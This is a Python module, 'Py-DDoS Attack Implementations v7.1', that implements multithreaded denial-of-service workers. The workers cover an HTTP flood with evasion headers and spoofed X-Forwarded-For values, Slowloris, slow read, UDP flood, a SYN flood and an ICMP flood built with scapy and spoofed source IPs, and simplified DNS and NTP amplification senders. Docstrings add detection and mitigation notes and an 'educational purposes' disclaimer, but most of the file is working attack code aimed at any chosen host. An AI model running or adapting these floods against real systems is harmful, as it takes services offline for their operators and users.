"""
Py-DDoS Attack Implementations v7.1
Comprehensive DDoS attack vectors across multiple OSI layers
For authorized testing and educational purposes only

Attack Types:
- HTTP Flood (L7)
- Slowloris (L7)
- Slow Read (L7)
- UDP Flood (L4)
- SYN Flood (L4)
- DNS Amplification (L4)
- ICMP Flood (L3)
- NTP Amplification (L4)
"""

import socket
import threading
import time
import random
import os
import string
import struct
from multiprocessing import Value

try:
    from scapy.all import IP, TCP, UDP, ICMP, RandShort, send, Raw
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class AttackMetrics:
    """
    Track attack statistics for real-time monitoring
    
    Attributes:
        success_count: Number of successful packets/requests sent
        error_count: Number of failed attempts
        bytes_sent: Total bytes transmitted
        packets_sent: Total packets/requests sent
    """
    def __init__(self):
        self.success_count = 0
        self.error_count = 0
        self.bytes_sent = 0
        self.packets_sent = 0


class AttackWorkers:
    """
    Advanced DDoS attack worker implementation
    
    Implements 8 different attack types across OSI layers 3-7
    Each attack runs in its own thread for parallelization
    
    Attributes:
        host: Target IP address or hostname
        port: Target port number
        stop_event: Threading event to signal worker termination
        counter: Multiprocessing counter for request tracking
        proxies: Optional proxy configuration (for HTTP attacks)
        metrics: AttackMetrics instance for statistics
    """
    
    def __init__(self, host, port, stop_event, counter, use_tor=False, proxies=None):
        """
        Initialize attack worker
        
        Args:
            host: Target IP or hostname
            port: Target port (1-65535)
            stop_event: Threading event for graceful shutdown
            counter: Integer counter or multiprocessing.Value (shared across threads)
            use_tor: Whether to use TOR proxy (for HTTP attacks)
            proxies: Proxy configuration dictionary
        """
        self.host = host
        self.port = port
        self.stop_event = stop_event
        self.counter = counter
        self.counter_lock = None
        self.proxies = proxies
        self.metrics = AttackMetrics()
    
    def increment_counter(self, amount: int = 1):
        """
        Thread-safe increment of global request counter
        Supports both ThreadSafeCounter and multiprocessing.Value for compatibility
        
        Args:
            amount: Number to increment by (default: 1)
        """
        # Check if counter has a get_lock method (multiprocessing.Value or ThreadSafeCounter)
        if hasattr(self.counter, 'increment'):
            # ThreadSafeCounter interface
            self.counter.increment(amount)
        elif hasattr(self.counter, 'get_lock'):
            # multiprocessing.Value interface (for backward compatibility)
            with self.counter.get_lock():
                self.counter.value += amount
        else:
            # Unsupported counter type - skip incrementing
            pass
    
    # ==================== LAYER 7 ATTACKS (APPLICATION LAYER) ====================
    
    def http_flood(self):
        """
        HTTP Layer 7 Flood Attack
        
        Sends rapid HTTP GET/POST requests with randomized headers,
        user agents, and request parameters to overwhelm web servers
        at the application layer.
        
        Target Behavior:
        - Initial: Requests process normally
        - Under load: Slow response times
        - Overloaded: 503 Service Unavailable, connection drops
        
        Detection Methods:
        - Unusual request rate (>1000 RPS from single IP)
        - Missing cache headers
        - Suspicious user agents
        - Same source IP pattern
        
        Mitigation:
        - Rate limiting (requests per second)
        - CAPTCHA challenges
        - WAF rules
        - Geo-blocking
        - Load balancing
        """
        import requests
        from urllib3.util.retry import Retry
        from requests.adapters import HTTPAdapter
        
        session = requests.Session()
        
        # Setup retry strategy (no retries to maximize attack)
        retry = Retry(connect=0, backoff_factor=0)
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        if self.proxies:
            session.proxies.update(self.proxies)
        
        # Realistic user agents for evasion
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Mobile Safari',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0',
        ]
        
        while not self.stop_event.is_set():
            try:
                # Randomize headers to evade detection
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
                    'X-Requested-With': 'XMLHttpRequest',
                    'Connection': 'keep-alive'
                }
                
                # Vary request parameters to bypass caching
                param = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
                url = f"http://{self.host}:{self.port}/?{param}={random.randint(0,999999)}"
                
                response = session.get(url, headers=headers, timeout=2, verify=False)
                self.metrics.success_count += 1
                self.metrics.bytes_sent += len(response.content)
                self.metrics.packets_sent += 1
                self.increment_counter()
            except Exception:
                self.metrics.error_count += 1
                time.sleep(0.01)
    
    def slowloris(self):
        """
        Slowloris Attack
        
        Keeps HTTP connections alive indefinitely by sending partial
        HTTP request headers. Server waits for request completion,
        exhausting the connection pool.
        
        Connection Flow:
        1. Establish TCP connection
        2. Send incomplete HTTP headers
        3. Periodically send more headers (never complete)
        4. Server maintains connection waiting for completion
        5. Connection pool exhausted → new connections refused
        
        Server Behavior:
        - Initial: Connections accepted
        - Under attack: New connections timeout
        - Overloaded: Legitimate users cannot connect
        
        Detection:
        - Connections with no completed requests
        - Incomplete HTTP headers in logs
        - Long connection duration
        
        Mitigation:
        - Connection timeout (aggressive: <30 seconds)
        - Request timeout
        - Slowloris-specific WAF rules
        - Reverse proxy buffering
        """
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(7)
            sock.connect((self.host, self.port))
            
            # Send incomplete HTTP request header
            sock.send(f"GET / HTTP/1.1\r\n".encode())
            sock.send(f"Host: {self.host}\r\n".encode())
            sock.send(f"User-Agent: {random.choice(['Mozilla/5.0', 'Chrome/120', 'Safari/17'])}\r\n".encode())
            sock.send(f"Accept: */*\r\n".encode())
            sock.send(f"Connection: keep-alive\r\n".encode())
            
            req_count = 0
            last_send = time.time()
            
            # Keep adding headers indefinitely
            while not self.stop_event.is_set() and req_count < 1000:
                try:
                    # Send header to keep connection alive
                    sock.send(f"X-Keep-Alive-{req_count}: {random.randint(1,99999)}\r\n".encode())
                    self.metrics.success_count += 1
                    self.metrics.packets_sent += 1
                    req_count += 1
                    self.increment_counter()
                    
                    # Randomized keep-alive interval
                    time.sleep(random.uniform(0.5, 3.0))
                    
                except socket.timeout:
                    break
                except Exception:
                    self.metrics.error_count += 1
                    break
        except Exception:
            self.metrics.error_count += 1
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
    
    def slowread(self):
        """
        Slow Read Attack
        
        Connects to server and reads response extremely slowly,
        keeping server resources allocated for extended periods.
        
        Connection Flow:
        1. Establish TCP connection
        2. Send complete HTTP request
        3. Read response at 1 byte per second
        4. Server waits for read completion
        5. Server resources held for long duration
        
        Server Behavior:
        - Initial: Request processed normally
        - Under attack: Requests stalled at read phase
        - Overloaded: Server memory/connections exhausted
        
        Resource Impact:
        - Server memory (buffers for slow reads)
        - Connection slots occupied
        - Thread/process resources
        
        Detection:
        - Stalled data transfers
        - Unusual connection duration
        - Slow read signatures in WAF
        
        Mitigation:
        - Read timeout (aggressive: <5 seconds)
        - Chunk response sending
        - Reverse proxy buffering
        """
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((self.host, self.port))
            
            # Send complete HTTP request
            request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"User-Agent: Mozilla/5.0\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            )
            sock.send(request.encode())
            self.metrics.packets_sent += 1
            self.increment_counter()
            
            # Read response very slowly - 1 byte per second
            while not self.stop_event.is_set():
                try:
                    data = sock.recv(1)
                    if data:
                        self.metrics.bytes_sent += 1
                        self.metrics.success_count += 1
                    time.sleep(random.uniform(0.5, 2.0))
                except socket.timeout:
                    break
                except Exception:
                    break
        except Exception:
            self.metrics.error_count += 1
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
    
    # ==================== LAYER 4 ATTACKS (TRANSPORT LAYER) ====================
    
    def udp_flood(self):
        """
        UDP Flood Attack (Layer 4)
        
        Sends high volume of UDP packets to target port.
        UDP connectionless nature allows rapid packet transmission.
        
        Packet Flow:
        1. No connection establishment (no handshake)
        2. Generate random payload (512-1472 bytes)
        3. Send to target port
        4. No confirmation required
        5. Maximum speed transmission possible
        
        Network Impact:
        - Bandwidth consumption
        - Router CPU utilization
        - Network interface saturation
        - Dropped legitimate traffic
        
        Server Behavior:
        - Attempted response (ICMP unreachable)
        - CPU spike from processing packets
        - Bandwidth exhaustion
        
        Detection:
        - Unusual UDP packet rate
        - Single source IP to single destination
        - High packet rate on specific port
        - Packet patterns (all from same source)
        
        Mitigation:
        - Rate limiting (packets per second)
        - Firewall rules (protocol, port)
        - Load distribution
        - ISP upstream filtering
        - Anycast scrubbing
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while not self.stop_event.is_set():
            try:
                # Generate random payload
                payload = os.urandom(random.randint(512, 1472))
                sock.sendto(payload, (self.host, self.port))
                
                self.metrics.success_count += 1
                self.metrics.bytes_sent += len(payload)
                self.metrics.packets_sent += 1
                self.increment_counter()
            except Exception:
                self.metrics.error_count += 1
                time.sleep(0.001)
        
        try:
            sock.close()
        except:
            pass
    
    def syn_flood(self):
        """
        SYN Flood Attack (Layer 4)
        
        Sends TCP SYN packets with spoofed source IP addresses
        to exhaust server's SYN backlog queue.
        
        TCP Handshake Hijacking:
        1. Normal: Client sends SYN → Server responds SYN-ACK → Client sends ACK
        2. SYN Flood: Attacker sends SYN with fake source → Server allocates resources
        3. Server waits for ACK from fake source (which never comes)
        4. Connection slots filled with half-open connections
        5. Real clients cannot establish connections
        
        Server State:
        - SYN backlog queue fills
        - New connections timeout
        - Legitimate users cannot connect
        
        Detection:
        - Abnormal number of SYN_RECV state connections (netstat)
        - High SYN packet rate
        - Source IPs never send ACK
        - Spoofed source IPs
        
        Mitigation:
        - SYN cookies (don't allocate resources until ACK)
        - SYN backlog increase
        - Firewall SYN rate limiting
        - SYN proxy
        - Anycast scrubbing
        
        Note: Requires raw socket access (root/admin privileges)
        """
        if not SCAPY_AVAILABLE:
            # Fallback to HTTP flood if Scapy unavailable
            return self.http_flood()
        
        while not self.stop_event.is_set():
            try:
                # Randomize source IP for spoofing
                src_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                src_port = random.randint(1024, 65535)
                
                # Craft SYN packet with spoofed source
                pkt = IP(src=src_ip, dst=self.host) / TCP(sport=src_port, dport=self.port, flags="S")
                send(pkt, verbose=0)
                
                self.metrics.success_count += 1
                self.metrics.bytes_sent += len(pkt)
                self.metrics.packets_sent += 1
                self.increment_counter()
            except Exception:
                self.metrics.error_count += 1
    
    def icmp_flood(self):
        """
        ICMP Flood Attack (Layer 3 - Network Layer)
        Also known as "Ping Flood"
        
        Sends massive number of ICMP echo requests (ping) to target.
        
        ICMP Flow:
        1. Attacker sends ICMP echo request (ping)
        2. Target responds with ICMP echo reply
        3. Both directions consume bandwidth
        4. Attacker sends many pings rapidly
        5. Target resources exhausted responding
        
        Bandwidth Consumption:
        - Request: Large payload (up to 1472 bytes)
        - Response: Echoed back (same size)
        - Total: 2x payload per ping (request + response)
        
        Network Impact:
        - Bandwidth saturation
        - Router CPU spike
        - Network interface bottleneck
        - Legitimate traffic dropped
        
        Detection:
        - High ICMP packet rate
        - Unusual ICMP echo volume
        - Single source to single destination
        - Large packet sizes (>64 bytes is suspicious)
        
        Mitigation:
        - Rate limit ICMP
        - Firewall rules (block or rate limit)
        - Network edge filtering
        - ISP upstream filtering
        
        Note: Requires raw socket access (root/admin privileges)
        """
        if not SCAPY_AVAILABLE:
            return self.http_flood()
        
        while not self.stop_event.is_set():
            try:
                # Generate random ICMP payload
                payload = os.urandom(random.randint(32, 1472))
                pkt = IP(dst=self.host) / ICMP() / Raw(load=payload)
                send(pkt, verbose=0)
                
                self.metrics.success_count += 1
                self.metrics.bytes_sent += len(pkt)
                self.metrics.packets_sent += 1
                self.increment_counter()
            except Exception:
                self.metrics.error_count += 1
    
    # ==================== AMPLIFICATION ATTACKS ====================
    
    def dns_amplification(self):
        """
        DNS Amplification Attack
        
        Exploits open DNS resolvers to amplify DDoS traffic
        toward target with spoofed source IP.
        
        Amplification Mechanism:
        - Attacker Query: Small DNS query (~60 bytes)
        - Resolver Response: Large DNS response (~500+ bytes)
        - Amplification Factor: 5-50x (small query → large response)
        - Source Spoofing: Query appears from target IP
        - Result: Target receives large responses it didn't request
        
        Attack Flow:
        1. Attacker sends DNS query to open resolver
        2. Query source IP spoofed to target IP
        3. Resolver sends large response to target
        4. Target bombarded with responses
        5. Bandwidth exhaustion (amplified)
        
        Query Types Used:
        - ANY query (returns all records) - massive response
        - TXT record (often large)
        - MX record query
        
        Detection:
        - Unexpected DNS responses
        - Multiple DNS servers responding
        - Large response packets
        - Source IPs from different DNS providers
        
        Mitigation:
        - Rate limit DNS responses
        - Close DNS resolvers (restrict recursion)
        - Firewall rate limiting
        - ISP filtering
        - DNS sink-holing
        
        Note: Educational implementation only (simplified DNS query format)
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Simple DNS query packet (any query to amplify response)
        dns_query = bytes([
            0x00, 0x01,  # Transaction ID
            0x01, 0x00,  # Flags (standard query, recursion desired)
            0x00, 0x01,  # Questions
            0x00, 0x00,  # Answer RRs
            0x00, 0x00,  # Authority RRs
            0x00, 0x00   # Additional RRs
        ])
        
        while not self.stop_event.is_set():
            try:
                sock.sendto(dns_query, (self.host, 53))
                self.metrics.success_count += 1
                self.metrics.bytes_sent += len(dns_query)
                self.metrics.packets_sent += 1
                self.increment_counter()
            except Exception:
                self.metrics.error_count += 1
                time.sleep(0.001)
        
        try:
            sock.close()
        except:
            pass
    
    def ntp_amplification(self):
        """
        NTP Amplification Attack
        
        Exploits NTP (Network Time Protocol) servers to amplify
        DDoS traffic toward target via spoofed source IP.
        
        Amplification Mechanism:
        - Attacker Query: Small NTP MONLIST query (~60 bytes)
        - Server Response: Large MONLIST data (~512+ bytes per entry)
        - Amplification Factor: 5-50x (or more with monolithic response)
        - Source Spoofing: Query appears from target IP
        
        NTP MONLIST Query:
        - Requests monitoring list from NTP server
        - Server returns list of recent clients
        - Response size proportional to request but can be huge
        - 600+ byte response common (10x amplification)
        
        Attack Flow:
        1. Attacker sends MONLIST query to NTP server
        2. Source IP spoofed to target
        3. NTP server sends large MONLIST to target
        4. Multiple NTP servers attacked in parallel
        5. Target receives amplified traffic from many sources
        
        NTP Servers Targeted:
        - Public/open NTP servers
        - Version 3 or 4 (older versions more amplifying)
        - Common ports: 123, 323, 1119
        
        Detection:
        - NTP traffic from unexpected sources
        - NTP MONLIST responses
        - Asymmetric traffic (responses much larger)
        - Multiple NTP sources
        
        Mitigation:
        - Disable MONLIST command (ntpd)
        - Rate limit NTP
        - Firewall NTP restrictions
        - ISP filtering
        - Closed NTP servers (authentication)
        
        Note: Educational implementation - simplified NTP packet format
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # NTP MONLIST request (simplified packet structure)
        ntp_request = bytes([
            0x17, 0x00, 0x03, 0x2a,  # NTP header (MONLIST request)
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00
        ])
        
        while not self.stop_event.is_set():
            try:
                sock.sendto(ntp_request, (self.host, 123))
                self.metrics.success_count += 1
                self.metrics.bytes_sent += len(ntp_request)
                self.metrics.packets_sent += 1
                self.increment_counter()
            except Exception:
                self.metrics.error_count += 1
                time.sleep(0.001)
        
        try:
            sock.close()
        except:
            pass


# Maintain backward compatibility
__all__ = ['AttackWorkers', 'AttackMetrics']
